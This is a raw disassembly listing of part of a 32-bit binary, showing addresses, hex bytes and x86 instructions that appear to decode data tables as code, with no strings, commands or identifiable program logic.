  406fab:	00 7a 00             	add    %bh,0x0(%edx)
  406fae:	00 00                	add    %al,(%eax)
  406fb0:	2d 00 00 00 d0       	sub    $0xd0000000,%eax
  406fb5:	00 00                	add    %al,(%eax)
  406fb7:	00 92 00 00 00 7e    	add    %dl,0x7e000000(%edx)
  406fbd:	00 00                	add    %al,(%eax)
  406fbf:	00 1a                	add    %bl,(%edx)
  406fc1:	00 00                	add    %al,(%eax)
  406fc3:	00 24 01             	add    %ah,(%ecx,%eax,1)
  406fc6:	00 00                	add    %al,(%eax)
  406fc8:	0a 00                	or     (%eax),%al
  406fca:	00 00                	add    %al,(%eax)
  406fcc:	61                   	popa
  406fcd:	00 00                	add    %al,(%eax)
  406fcf:	00 01                	add    %al,(%ecx)
  406fd1:	00 00                	add    %al,(%eax)
  406fd3:	00 02                	add    %al,(%edx)
  406fd5:	00 00                	add    %al,(%eax)
  406fd7:	00 42 00             	add    %al,0x0(%edx)
  406fda:	00 00                	add    %al,(%eax)
  406fdc:	01 00                	add    %eax,(%eax)
  406fde:	00 00                	add    %al,(%eax)
  406fe0:	01 00                	add    %eax,(%eax)
  406fe2:	00 00                	add    %al,(%eax)
  406fe4:	01 00                	add    %eax,(%eax)
  406fe6:	00 00                	add    %al,(%eax)
  406fe8:	34 00                	xor    $0x0,%al
  406fea:	00 00                	add    %al,(%eax)
  406fec:	06                   	push   %es
  406fed:	00 00                	add    %al,(%eax)
  406fef:	00 1e                	add    %bl,(%esi)
  406ff1:	00 00                	add    %al,(%eax)
  406ff3:	00 0d 00 00 00 02    	add    %cl,0x2000000
  406ff9:	00 00                	add    %al,(%eax)
  406ffb:	00 01                	add    %al,(%ecx)
  406ffd:	00 00                	add    %al,(%eax)
  406fff:	00 04 00             	add    %al,(%eax,%eax,1)
  407002:	00 00                	add    %al,(%eax)
  407004:	21 00                	and    %eax,(%eax)
  407006:	00 00                	add    %al,(%eax)
  407008:	4f                   	dec    %edi
  407009:	00 00                	add    %al,(%eax)
  40700b:	00 00                	add    %al,(%eax)
  40700d:	00 b2 0c 01 00 00    	add    %dh,0x10c(%edx)
  407013:	00 00                	add    %al,(%eax)
  407015:	00 06                	add    %al,(%esi)
  407017:	00 23                	add    %ah,(%ebx)
  407019:	17                   	pop    %ss
  40701a:	be 0f 06 00 9a       	mov    $0x9a00060f,%esi
  40701f:	02 79 06             	add    0x6(%ecx),%bh
  407022:	06                   	push   %es
  407023:	00 b3 1a cf 10 06    	add    %dh,0x610cf1a(%ebx)
  407029:	00 ec                	add    %ch,%ah
  40702b:	0e                   	push   %cs
  40702c:	f7 15 06 00 bb 15    	notl   0x15bb0006
  407032:	be 0f 06 00 ad       	mov    $0xad00060f,%esi
  407037:	09 be 0f 06 00 7d    	or     %edi,0x7d00060f(%esi)
  40703d:	09 08                	or     %ecx,(%eax)
  40703f:	15 06 00 92 12       	adc    $0x12920006,%eax
  407044:	08 15 06 00 b7 01    	or     %dl,0x1b70006
  40704a:	08 15 06 00 05 14    	or     %dl,0x14050006
  407050:	08 15 06 00 5b 11    	or     %dl,0x115b0006
  407056:	be 0f 06 00 95       	mov    $0x9500060f,%esi
  40705b:	01 be 0f 06 00 d4    	add    %edi,-0x2bfff9f1(%esi)
  407061:	01 79 06             	add    %edi,0x6(%ecx)
  407064:	06                   	push   %es
  407065:	00 8e 01 f7 15 06    	add    %cl,0x615f701(%esi)
  40706b:	00 7b 12             	add    %bh,0x12(%ebx)
  40706e:	08 15 06 00 9e 01    	or     %dl,0x19e0006
  407074:	08 15 0a 00 65 17    	or     %dl,0x1765000a
  40707a:	91                   	xchg   %eax,%ecx
  40707b:	16                   	push   %ss
  40707c:	06                   	push   %es
  40707d:	00 4c 09 be          	add    %cl,-0x42(%ecx,%ecx,1)
  407081:	0f 06                	clts
  407083:	00 93 02 be 0f 06    	add    %dl,0x60fbe02(%ebx)
  407089:	00 80 01 79 06 06    	add    %al,0x6067901(%eax)
  40708f:	00 a9 12 6c 19 06    	add    %ch,0x6196c12(%ecx)
  407095:	00 cc                	add    %cl,%ah
  407097:	15 be 0f 06 00       	adc    $0x60fbe,%eax
  40709c:	33 14 4f             	xor    (%edi,%ecx,2),%edx
  40709f:	06                   	push   %es
  4070a0:	06                   	push   %es
  4070a1:	00 a9 0d 6c 19 06    	add    %ch,0x6196c0d(%ecx)
  4070a7:	00 79 01             	add    %bh,0x1(%ecx)
  4070aa:	be 0f 0a 00 75       	mov    $0x75000a0f,%esi
  4070af:	16                   	push   %ss
  4070b0:	bc 14 06 00 6c       	mov    $0x6c000614,%esp
  4070b5:	0b 08                	or     (%eax),%ecx
  4070b7:	15 06 00 d9 0b       	adc    $0xbd90006,%eax
  4070bc:	08 15 06 00 6d 0a    	or     %dl,0xa6d0006
  4070c2:	bc 14 77 00 28       	mov    $0x28007714,%esp
  4070c7:	15 00 00 06 00       	adc    $0x60000,%eax
  4070cc:	95                   	xchg   %eax,%ebp
  4070cd:	0a cf                	or     %bh,%cl
  4070cf:	10 06                	adc    %al,(%esi)
  4070d1:	00 4f 0b             	add    %cl,0xb(%edi)
  4070d4:	cf                   	iret
  4070d5:	10 06                	adc    %al,(%esi)
  4070d7:	00 30                	add    %dh,(%eax)
  4070d9:	0b cf                	or     %edi,%ecx
  4070db:	10 06                	adc    %al,(%esi)
  4070dd:	00 c0                	add    %al,%al
  4070df:	0b cf                	or     %edi,%ecx
  4070e1:	10 06                	adc    %al,(%esi)
  4070e3:	00 8c 0b cf 10 06 00 	add    %cl,0x610cf(%ebx,%ecx,1)
  4070ea:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4070eb:	0b cf                	or     %edi,%ecx
  4070ed:	10 06                	adc    %al,(%esi)
  4070ef:	00 c7                	add    %al,%bh
  4070f1:	0a cf                	or     %bh,%cl
  4070f3:	10 06                	adc    %al,(%esi)
  4070f5:	00 81 0a e9 14 06    	add    %al,0x614e90a(%ecx)
  4070fb:	00 5f 0a             	add    %bl,0xa(%edi)
  4070fe:	e9 14 06 00 13       	jmp    0x13407717
  407103:	0b cf                	or     %edi,%ecx
  407105:	10 06                	adc    %al,(%esi)
  407107:	00 e2                	add    %ah,%dl
  407109:	0a b2 0d 06 00 ac    	or     -0x53fff9f3(%edx),%dh
  40710f:	0a 08                	or     (%eax),%cl
  407111:	15 06 00 db 09       	adc    $0x9db0006,%eax
  407116:	be 0f 06 00 44       	mov    $0x4400060f,%esi
  40711b:	0a 08                	or     (%eax),%cl
  40711d:	15 06 00 fb 0a       	adc    $0xafb0006,%eax
  407122:	bc 14 06 00 0b       	mov    $0xb000614,%esp
  407127:	0c be                	or     $0xbe,%al
  407129:	0f 06                	clts
  40712b:	00 b5 14 be 0f 06    	add    %dh,0x60fbe14(%ebp)
  407131:	00 21                	add    %ah,(%ecx)
  407133:	1a be 0f 06 00 22    	sbb    0x2200060f(%esi),%bh
  407139:	10 be 0f 06 00 be    	adc    %bh,-0x41fff9f1(%esi)
  40713f:	13 be 0f 06 00 26    	adc    0x2600060f(%esi),%edi
  407145:	09 cf                	or     %ecx,%edi
  407147:	10 06                	adc    %al,(%esi)
  407149:	00 05 0e be 0f 06    	add    %al,0x60fbe0e
  40714f:	00 9c 08 be 0f 06 00 	add    %bl,0x60fbe(%eax,%ecx,1)
  407156:	7e 14                	jle    0x40716c
  407158:	be 0f 06 00 8b       	mov    $0x8b00060f,%esi
  40715d:	11 cf                	adc    %ecx,%edi
  40715f:	10 06                	adc    %al,(%esi)
  407161:	00 9b 15 cf 10 06    	add    %bl,0x610cf15(%ebx)
  407167:	00 02                	add    %al,(%edx)
  407169:	0a cf                	or     %bh,%cl
  40716b:	10 06                	adc    %al,(%esi)
  40716d:	00 e5                	add    %ah,%ch
  40716f:	14 79                	adc    $0x79,%al
  407171:	1a 06                	sbb    (%esi),%al
  407173:	00 eb                	add    %ch,%bl
  407175:	0f 79 1a             	vmwrite (%edx),%ebx
  407178:	06                   	push   %es
  407179:	00 89 0f 4f 06 06    	add    %cl,0x6064f0f(%ecx)
  40717f:	00 7c 0f 79          	add    %bh,0x79(%edi,%ecx,1)
  407183:	1a 06                	sbb    (%esi),%al
  407185:	00 c5                	add    %al,%ch
  407187:	0f 79 1a             	vmwrite (%edx),%ebx
  40718a:	06                   	push   %es
  40718b:	00 8f 0f 4f 06 06    	add    %cl,0x6064f0f(%edi)
  407191:	00 04 08             	add    %al,(%eax,%ecx,1)
  407194:	79 1a                	jns    0x4071b0
  407196:	06                   	push   %es
  407197:	00 6c 08 be          	add    %ch,-0x42(%eax,%ecx,1)
  40719b:	0f 06                	clts
  40719d:	00 01                	add    %al,(%ecx)
  40719f:	18 be 0f 06 00 58    	sbb    %bh,0x5800060f(%esi)
  4071a5:	1b f9                	sbb    %ecx,%edi
  4071a7:	0e                   	push   %cs
  4071a8:	06                   	push   %es
  4071a9:	00 49 1b             	add    %cl,0x1b(%ecx)
  4071ac:	14 16                	adc    $0x16,%al
  4071ae:	06                   	push   %es
  4071af:	00 fc                	add    %bh,%ah
  4071b1:	0f be 0f             	movsbl (%edi),%ecx
  4071b4:	0b 00                	or     (%eax),%eax
  4071b6:	fc                   	cld
  4071b7:	10 00                	adc    %al,(%eax)
  4071b9:	00 0e                	add    %cl,(%esi)
  4071bb:	00 61 08             	add    %ah,0x8(%ecx)
  4071be:	20 12                	and    %dl,(%edx)
  4071c0:	06                   	push   %es
  4071c1:	00 16                	add    %dl,(%esi)
  4071c3:	02 be 0f 37 00 73    	add    0x7300370f(%esi),%bh
  4071c9:	14 00                	adc    $0x0,%al
  4071cb:	00 06                	add    %al,(%esi)
  4071cd:	00 eb                	add    %ch,%bl
  4071cf:	1a f7                	sbb    %bh,%dh
  4071d1:	15 06 00 99 17       	adc    $0x17990006,%eax
  4071d6:	be 0f 06 00 b6       	mov    $0xb600060f,%esi
  4071db:	0e                   	push   %cs
  4071dc:	be 0f 06 00 dc       	mov    $0xdc00060f,%esi
  4071e1:	03 be 0f 0a 00 bc    	add    -0x43fff5f1(%esi),%edi
  4071e7:	1a 91 16 0a 00 d5    	sbb    -0x2afff5ea(%ecx),%dl
  4071ed:	09 91 16 0a 00 c0    	or     %edx,-0x3ffff5ea(%ecx)
  4071f3:	09 91 16 0a 00 3f    	or     %edx,0x3f000a16(%ecx)
  4071f9:	18 5a 17             	sbb    %bl,0x17(%edx)
  4071fc:	0a 00                	or     (%eax),%al
  4071fe:	34 16                	xor    $0x16,%al
  407200:	91                   	xchg   %eax,%ecx
  407201:	16                   	push   %ss
  407202:	06                   	push   %es
  407203:	00 5c 16 08          	add    %bl,0x8(%esi,%edx,1)
  407207:	15 06 00 78 08       	adc    $0x8780006,%eax
  40720c:	be 0f 06 00 6f       	mov    $0x6f00060f,%esi
  407211:	13 be 0f 06 00 3e    	adc    0x3e00060f(%esi),%edi
  407217:	14 be                	adc    $0xbe,%al
  407219:	0f 06                	clts
  40721b:	00 c5                	add    %al,%ch
  40721d:	01 be 0f 0a 00 a8    	add    %edi,-0x57fff5f1(%esi)
  407223:	15 91 16 06 00       	adc    $0x61691,%eax
  407228:	13 10                	adc    (%eax),%edx
  40722a:	be 0f 06 00 42       	mov    $0x4200060f,%esi
  40722f:	11 be 0f 0a 00 c5    	adc    %edi,-0x3afff5f1(%esi)
  407235:	17                   	pop    %ss
  407236:	5a                   	pop    %edx
  407237:	17                   	pop    %ss
  407238:	06                   	push   %es
  407239:	00 68 07             	add    %ch,0x7(%eax)
  40723c:	94                   	xchg   %eax,%esp
  40723d:	0d 06 00 d2 13       	or     $0x13d20006,%eax
  407242:	be 0f 06 00 25       	mov    $0x2500060f,%esi
  407247:	1b 4f 06             	sbb    0x6(%edi),%ecx
  40724a:	06                   	push   %es
  40724b:	00 df                	add    %bl,%bh
  40724d:	11 4f 06             	adc    %ecx,0x6(%edi)
  407250:	06                   	push   %es
  407251:	00 56 0e             	add    %dl,0xe(%esi)
  407254:	4f                   	dec    %edi
  407255:	06                   	push   %es
  407256:	06                   	push   %es
  407257:	00 97 08 4f 06 06    	add    %dl,0x6064f08(%edi)
  40725d:	00 f7                	add    %dh,%bh
  40725f:	19 94 0d 0a 00 0d 18 	sbb    %edx,0x180d000a(%ebp,%ecx,1)
  407266:	13 0f                	adc    (%edi),%ecx
  407268:	12 00                	adc    (%eax),%al
  40726a:	7d 13                	jge    0x40727f
  40726c:	ef                   	out    %eax,(%dx)
  40726d:	17                   	pop    %ss
  40726e:	12 00                	adc    (%eax),%al
  407270:	e1 10                	loope  0x407282
  407272:	ef                   	out    %eax,(%dx)
  407273:	17                   	pop    %ss
  407274:	97                   	xchg   %eax,%edi
  407275:	01 55 14             	add    %edx,0x14(%ebp)
  407278:	00 00                	add    %al,(%eax)
  40727a:	12 00                	adc    (%eax),%al
  40727c:	e8 16 ef 17 12       	call   0x12586197
  407281:	00 19                	add    %bl,(%ecx)
  407283:	17                   	pop    %ss
  407284:	ef                   	out    %eax,(%dx)
  407285:	17                   	pop    %ss
  407286:	06                   	push   %es
  407287:	00 17                	add    %dl,(%edi)
  407289:	02 be 0f 06 00 b5    	add    -0x4afff9f1(%esi),%bh
  40728f:	0f be 0f             	movsbl (%edi),%ecx
  407292:	06                   	push   %es
  407293:	00 a5 11 4f 06 06    	add    %ah,0x6064f11(%ebp)
  407299:	00 8f 03 be 0f 06    	add    %cl,0x60fbe03(%edi)
  40729f:	00 62 12             	add    %ah,0x12(%edx)
  4072a2:	79 1a                	jns    0x4072be
  4072a4:	06                   	push   %es
  4072a5:	00 d8                	add    %bl,%al
  4072a7:	0f 79 1a             	vmwrite (%edx),%ebx
  4072aa:	06                   	push   %es
  4072ab:	00 f1                	add    %dh,%cl
  4072ad:	0e                   	push   %cs
  4072ae:	e9 14 06 00 69       	jmp    0x694078c7
  4072b3:	1a 06                	sbb    (%esi),%al
  4072b5:	02 0a                	add    (%edx),%cl
  4072b7:	00 bd 11 bc 14 06    	add    %bh,0x614bc11(%ebp)
  4072bd:	00 43 12             	add    %al,0x12(%ebx)
  4072c0:	4f                   	dec    %edi
  4072c1:	06                   	push   %es
  4072c2:	06                   	push   %es
  4072c3:	00 50 12             	add    %dl,0x12(%eax)
  4072c6:	4f                   	dec    %edi
  4072c7:	06                   	push   %es
  4072c8:	06                   	push   %es
  4072c9:	00 32                	add    %dh,(%edx)
  4072cb:	12 be 0f 06 00 49    	adc    0x4900060f(%esi),%bh
  4072d1:	16                   	push   %ss
  4072d2:	be 0f 06 00 45       	mov    $0x4500060f,%esi
  4072d7:	0c 06                	or     $0x6,%al
  4072d9:	02 06                	add    (%esi),%al
  4072db:	00 a2 19 06 02 06    	add    %ah,0x6020619(%edx)
  4072e1:	00 b9 10 be 0f 06    	add    %bh,0x60fbe10(%ecx)
  4072e7:	00 9b 18 be 0f 0a    	add    %bl,0xa0fbe18(%ebx)
  4072ed:	00 b4 08 bc 14 00 00 	add    %dh,0x14bc(%eax,%ecx,1)
  4072f4:	00 00                	add    %al,(%eax)
  4072f6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4072f7:	05 00 00 00 00       	add    $0x0,%eax
  4072fc:	01 00                	add    %eax,(%eax)
  4072fe:	01 00                	add    %eax,(%eax)
  407300:	00 00                	add    %al,(%eax)
  407302:	10 00                	adc    %al,(%eax)
  407304:	a0 10 df 17 05       	mov    0x517df10,%al
  407309:	00 01                	add    %al,(%ecx)
  40730b:	00 01                	add    %al,(%ecx)
  40730d:	00 00                	add    %al,(%eax)
  40730f:	00 10                	add    %dl,(%eax)
  407311:	00 a5 13 df 17 05    	add    %ah,0x517df13(%ebp)
  407317:	00 03                	add    %al,(%ebx)
  407319:	00 09                	add    %cl,(%ecx)
  40731b:	00 03                	add    %al,(%ebx)
  40731d:	01 10                	add    %edx,(%eax)
  40731f:	00 21                	add    %ah,(%ecx)
  407321:	03 00                	add    (%eax),%eax
  407323:	00 19                	add    %bl,(%ecx)
  407325:	00 05 00 0c 00 00    	add    %al,0xc00
  40732b:	00 10                	add    %dl,(%eax)
  40732d:	00 65 11             	add    %ah,0x11(%ebp)
  407330:	df 17                	fists  (%edi)
  407332:	05 00 13 00 0e       	add    $0xe001300,%eax
  407337:	00 00                	add    %al,(%eax)
  407339:	00 10                	add    %dl,(%eax)
  40733b:	00 e9                	add    %ch,%cl
  40733d:	13 df                	adc    %edi,%ebx
  40733f:	17                   	pop    %ss
  407340:	05 00 13 00 11       	add    $0x11001300,%eax
  407345:	00 03                	add    %al,(%ebx)
  407347:	01 10                	add    %edx,(%eax)
  407349:	00 0d 03 00 00 19    	add    %cl,0x19000003
  40734f:	00 15 00 1b 00 03    	add    %dl,0x3001b00
  407355:	01 10                	add    %edx,(%eax)
  407357:	00 27                	add    %ah,(%edi)
  407359:	04 00                	add    $0x0,%al
  40735b:	00 19                	add    %bl,(%ecx)
  40735d:	00 1b                	add    %bl,(%ebx)
  40735f:	00 1d 00 03 01 10    	add    %bl,0x10010300
  407365:	00 8d 04 00 00 19    	add    %cl,0x19000004(%ebp)
  40736b:	00 1f                	add    %bl,(%edi)
  40736d:	00 1f                	add    %bl,(%edi)
  40736f:	00 03                	add    %al,(%ebx)
  407371:	01 10                	add    %edx,(%eax)
  407373:	00 db                	add    %bl,%bl
  407375:	04 00                	add    $0x0,%al
  407377:	00 19                	add    %bl,(%ecx)
  407379:	00 24 00             	add    %ah,(%eax,%eax,1)
  40737c:	21 00                	and    %eax,(%eax)
  40737e:	03 01                	add    (%ecx),%eax
  407380:	10 00                	adc    %al,(%eax)
  407382:	58                   	pop    %eax
  407383:	05 00 00 19 00       	add    $0x190000,%eax
  407388:	2d 00 23 00 03       	sub    $0x3002300,%eax
  40738d:	01 10                	add    %edx,(%eax)
  40738f:	00 94 05 00 00 19 00 	add    %dl,0x190000(%ebp,%eax,1)
  407396:	32 00                	xor    (%eax),%al
  407398:	25 00 03 01 10       	and    $0x10010300,%eax
  40739d:	00 27                	add    %ah,(%edi)
  40739f:	00 00                	add    %al,(%eax)
  4073a1:	00 19                	add    %bl,(%ecx)
  4073a3:	00 38                	add    %bh,(%eax)
  4073a5:	00 27                	add    %ah,(%edi)
  4073a7:	00 03                	add    %al,(%ebx)
  4073a9:	01 10                	add    %edx,(%eax)
  4073ab:	00 43 01             	add    %al,0x1(%ebx)
  4073ae:	00 00                	add    %al,(%eax)
  4073b0:	19 00                	sbb    %eax,(%eax)
  4073b2:	3e 00 29             	add    %ch,%ds:(%ecx)
  4073b5:	00 01                	add    %al,(%ecx)
  4073b7:	00 10                	add    %dl,(%eax)
  4073b9:	00 2c 08             	add    %ch,(%eax,%ecx,1)
  4073bc:	df 17                	fists  (%edi)
  4073be:	05 00 45 00 2b       	add    $0x2b004500,%eax
  4073c3:	00 03                	add    %al,(%ebx)
  4073c5:	01 10                	add    %edx,(%eax)
  4073c7:	00 15 00 00 00 19    	add    %dl,0x19000000
  4073cd:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  4073d1:	00 03                	add    %al,(%ebx)
  4073d3:	01 10                	add    %edx,(%eax)
  4073d5:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4073d8:	00 00                	add    %al,(%eax)
  4073da:	19 00                	sbb    %eax,(%eax)
  4073dc:	50                   	push   %eax
  4073dd:	00 39                	add    %bh,(%ecx)
  4073df:	00 03                	add    %al,(%ebx)
  4073e1:	01 10                	add    %edx,(%eax)
  4073e3:	00 b5 02 00 00 19    	add    %dh,0x19000002(%ebp)
  4073e9:	00 5b 00             	add    %bl,0x0(%ebx)
  4073ec:	3b 00                	cmp    (%eax),%eax
  4073ee:	03 01                	add    (%ecx),%eax
  4073f0:	10 00                	adc    %al,(%eax)
  4073f2:	3d 03 00 00 19       	cmp    $0x19000003,%eax
  4073f7:	00 5f 00             	add    %bl,0x0(%edi)
  4073fa:	3d 00 03 01 10       	cmp    $0x10010300,%eax
  4073ff:	00 ee                	add    %ch,%dh
  407401:	04 00                	add    $0x0,%al
  407403:	00 19                	add    %bl,(%ecx)
  407405:	00 64 00 3f          	add    %ah,0x3f(%eax,%eax,1)
  407409:	00 00                	add    %al,(%eax)
  40740b:	00 10                	add    %dl,(%eax)
  40740d:	00 5b 12             	add    %bl,0x12(%ebx)
  407410:	df 17                	fists  (%edi)
  407412:	05 00 6c 00 41       	add    $0x41006c00,%eax
  407417:	00 01                	add    %al,(%ecx)
  407419:	00 10                	add    %dl,(%eax)
  40741b:	00 b0 13 df 17 05    	add    %dh,0x517df13(%eax)
  407421:	00 6f 00             	add    %ch,0x0(%edi)
  407424:	42                   	inc    %edx
  407425:	00 03                	add    %al,(%ebx)
  407427:	01 10                	add    %edx,(%eax)
  407429:	00 bc 03 00 00 19 00 	add    %bh,0x190000(%ebx,%eax,1)
  407430:	72 00                	jb     0x407432
  407432:	4e                   	dec    %esi
  407433:	00 03                	add    %al,(%ebx)
  407435:	01 10                	add    %edx,(%eax)
  407437:	00 3c 04             	add    %bh,(%esp,%eax,1)
  40743a:	00 00                	add    %al,(%eax)
  40743c:	19 00                	sbb    %eax,(%eax)
  40743e:	7a 00                	jp     0x407440
  407440:	50                   	push   %eax
  407441:	00 03                	add    %al,(%ebx)
  407443:	21 10                	and    %edx,(%eax)
  407445:	00 75 06             	add    %dh,0x6(%ebp)
  407448:	00 00                	add    %al,(%eax)
  40744a:	05 00 85 00 52       	add    $0x52008500,%eax
  40744f:	00 03                	add    %al,(%ebx)
  407451:	01 10                	add    %edx,(%eax)
  407453:	00 84 05 00 00 19 00 	add    %al,0x190000(%ebp,%eax,1)
  40745a:	87 00                	xchg   %eax,(%eax)
  40745c:	55                   	push   %ebp
  40745d:	00 03                	add    %al,(%ebx)
  40745f:	01 10                	add    %edx,(%eax)
  407461:	00 01                	add    %al,(%ecx)
  407463:	00 00                	add    %al,(%eax)
  407465:	00 19                	add    %bl,(%ecx)
  407467:	00 8c 00 57 00 00 00 	add    %cl,0x57(%eax,%eax,1)
  40746e:	10 00                	adc    %al,(%eax)
  407470:	96                   	xchg   %eax,%esi
  407471:	0f df 17             	pandn  (%edi),%mm2
  407474:	05 00 90 00 59       	add    $0x59009000,%eax
  407479:	00 03                	add    %al,(%ebx)
  40747b:	01 10                	add    %edx,(%eax)
  40747d:	00 37                	add    %dh,(%edi)
  40747f:	01 00                	add    %eax,(%eax)
  407481:	00 19                	add    %bl,(%ecx)
  407483:	00 9b 00 5f 00 01    	add    %bl,0x1005f00(%ebx)
  407489:	00 10                	add    %dl,(%eax)
  40748b:	00 1c 14             	add    %bl,(%esp,%edx,1)
  40748e:	df 17                	fists  (%edi)
  407490:	5d                   	pop    %ebp
  407491:	00 a4 00 61 00 01 00 	add    %ah,0x10061(%eax,%eax,1)
  407498:	10 00                	adc    %al,(%eax)
  40749a:	0e                   	push   %cs
  40749b:	16                   	push   %ss
  40749c:	df 17                	fists  (%edi)
  40749e:	05 00 a5 00 67       	add    $0x6700a500,%eax
  4074a3:	00 0d 01 10 00 41    	add    %cl,0x41001001
  4074a9:	06                   	push   %es
  4074aa:	00 00                	add    %al,(%eax)
  4074ac:	19 00                	sbb    %eax,(%eax)
  4074ae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4074af:	00 7d 00             	add    %bh,0x0(%ebp)
  4074b2:	03 21                	add    (%ecx),%esp
  4074b4:	10 00                	adc    %al,(%eax)
  4074b6:	75 06                	jne    0x4074be
  4074b8:	00 00                	add    %al,(%eax)
  4074ba:	05 00 a7 00 7d       	add    $0x7d00a700,%eax
  4074bf:	00 03                	add    %al,(%ebx)
  4074c1:	01 10                	add    %edx,(%eax)
  4074c3:	00 34 05 00 00 19 00 	add    %dh,0x190000(,%eax,1)
  4074ca:	aa                   	stos   %al,%es:(%edi)
  4074cb:	00 81 00 03 01 10    	add    %al,0x10010300(%ecx)
  4074d1:	00 ee                	add    %ch,%dh
  4074d3:	03 00                	add    (%eax),%eax
  4074d5:	00 19                	add    %bl,(%ecx)
  4074d7:	00 ad 00 83 00 03    	add    %ch,0x3008300(%ebp)
  4074dd:	01 10                	add    %edx,(%eax)
  4074df:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4074e3:	00 05 00 b6 00 85    	add    %al,0x8500b600
  4074e9:	00 03                	add    %al,(%ebx)
  4074eb:	01 10                	add    %edx,(%eax)
  4074ed:	00 65 04             	add    %ah,0x4(%ebp)
  4074f0:	00 00                	add    %al,(%eax)
  4074f2:	19 00                	sbb    %eax,(%eax)
  4074f4:	b7 00                	mov    $0x0,%bh
  4074f6:	87 00                	xchg   %eax,(%eax)
  4074f8:	03 01                	add    (%ecx),%eax
  4074fa:	10 00                	adc    %al,(%eax)
  4074fc:	a0 04 00 00 19       	mov    0x19000004,%al
  407501:	00 bb 00 89 00 03    	add    %bh,0x3008900(%ebx)
  407507:	01 10                	add    %edx,(%eax)
  407509:	00 a2 00 00 00 05    	add    %ah,0x5000000(%edx)
  40750f:	00 be 00 8b 00 03    	add    %bh,0x3008b00(%esi)
  407515:	01 10                	add    %edx,(%eax)
  407517:	00 07                	add    %al,(%edi)
  407519:	05 00 00 19 00       	add    $0x190000,%eax
  40751e:	c0 00 8d             	rolb   $0x8d,(%eax)
  407521:	00 03                	add    %al,(%ebx)
  407523:	01 10                	add    %edx,(%eax)
  407525:	00 67 05             	add    %ah,0x5(%edi)
  407528:	00 00                	add    %al,(%eax)
  40752a:	19 00                	sbb    %eax,(%eax)
  40752c:	c5 00                	lds    (%eax),%eax
  40752e:	8f 00                	pop    (%eax)
  407530:	03 01                	add    (%ecx),%eax
  407532:	10 00                	adc    %al,(%eax)
  407534:	38 00                	cmp    %al,(%eax)
  407536:	00 00                	add    %al,(%eax)
  407538:	19 00                	sbb    %eax,(%eax)
  40753a:	cc                   	int3
  40753b:	00 91 00 00 01 00    	add    %dl,0x10000(%ecx)
  407541:	00 b7 05 00 00 05    	add    %dh,0x5000005(%edi)
  407547:	00 cf                	add    %cl,%bh
  407549:	00 93 00 13 01 00    	add    %dl,0x11300(%ebx)
  40754f:	00 b1 04 00 00 19    	add    %dh,0x19000004(%ecx)
  407555:	00 d1                	add    %dl,%cl
  407557:	00 93 00 13 01 00    	add    %dl,0x11300(%ebx)
  40755d:	00 e9                	add    %ch,%cl
  40755f:	01 00                	add    %eax,(%eax)
  407561:	00 19                	add    %bl,(%ecx)
  407563:	00 d1                	add    %dl,%cl
  407565:	00 93 00 51 80 59    	add    %dl,0x59805100(%ebx)
  40756b:	01 0a                	add    %ecx,(%edx)
  40756d:	00 51 80             	add    %dl,-0x80(%ecx)
  407570:	26 06                	es push %es
  407572:	0a 00                	or     (%eax),%al
  407574:	06                   	push   %es
  407575:	00 40 15             	add    %al,0x15(%eax)
  407578:	56                   	push   %esi
  407579:	00 06                	add    %al,(%esi)
  40757b:	00 68 0e             	add    %ch,0xe(%eax)
  40757e:	5f                   	pop    %edi
  40757f:	00 06                	add    %al,(%esi)
  407581:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407584:	71 00                	jno    0x407586
  407586:	06                   	push   %es
  407587:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  40758d:	00 4b 14             	add    %cl,0x14(%ebx)
  407590:	78 00                	js     0x407592
  407592:	06                   	push   %es
  407593:	00 ed                	add    %ch,%ch
  407595:	15 7c 00 01 00       	adc    $0x1007c,%eax
  40759a:	3a 02                	cmp    (%edx),%al
  40759c:	80 00 01             	addb   $0x1,(%eax)
  40759f:	00 f2                	add    %dh,%dl
  4075a1:	02 80 00 01 00 95    	add    -0x6affff00(%eax),%al
  4075a7:	03 80 00 01 00 e3    	add    -0x1cffff00(%eax),%eax
  4075ad:	03 84 00 01 00 5a 04 	add    0x45a0001(%eax,%eax,1),%eax
  4075b4:	71 00                	jno    0x4075b6
  4075b6:	01 00                	add    %eax,(%eax)
  4075b8:	cd 04                	int    $0x4
  4075ba:	5f                   	pop    %edi
  4075bb:	00 01                	add    %al,(%ecx)
  4075bd:	00 72 01             	add    %dh,0x1(%edx)
  4075c0:	87 00                	xchg   %eax,(%eax)
  4075c2:	01 00                	add    %eax,(%eax)
  4075c4:	8c 02                	mov    %es,(%edx)
  4075c6:	8f 00                	pop    (%eax)
  4075c8:	01 00                	add    %eax,(%eax)
  4075ca:	36 03 96 00 01 00 2c 	add    %ss:0x2c000100(%esi),%edx
  4075d1:	05 9a 00 01 00       	add    $0x1009a,%eax
  4075d6:	1d 10 78 00 01       	sbb    $0x1007810,%eax
  4075db:	00 f2                	add    %dh,%dl
  4075dd:	13 7c 00 06          	adc    0x6(%eax,%eax,1),%edi
  4075e1:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  4075e4:	71 00                	jno    0x4075e6
  4075e6:	06                   	push   %es
  4075e7:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  4075ed:	00 67 06             	add    %ah,0x6(%edi)
  4075f0:	80 00 06             	addb   $0x6,(%eax)
  4075f3:	00 ed                	add    %ch,%ch
  4075f5:	15 d0 00 01 00       	adc    $0x100d0,%eax
  4075fa:	72 01                	jb     0x4075fd
  4075fc:	d4 00                	aam    $0x0
  4075fe:	01 00                	add    %eax,(%eax)
  407600:	8c 02                	mov    %es,(%edx)
  407602:	96                   	xchg   %eax,%esi
  407603:	00 06                	add    %al,(%esi)
  407605:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  407608:	71 00                	jno    0x40760a
  40760a:	06                   	push   %es
  40760b:	00 b7 12 74 00 06    	add    %dh,0x6007412(%edi)
  407611:	00 16                	add    %dl,(%esi)
  407613:	01 78 00             	add    %edi,0x0(%eax)
  407616:	01 00                	add    %eax,(%eax)
  407618:	72 01                	jb     0x40761b
  40761a:	8f 00                	pop    (%eax)
  40761c:	06                   	push   %es
  40761d:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
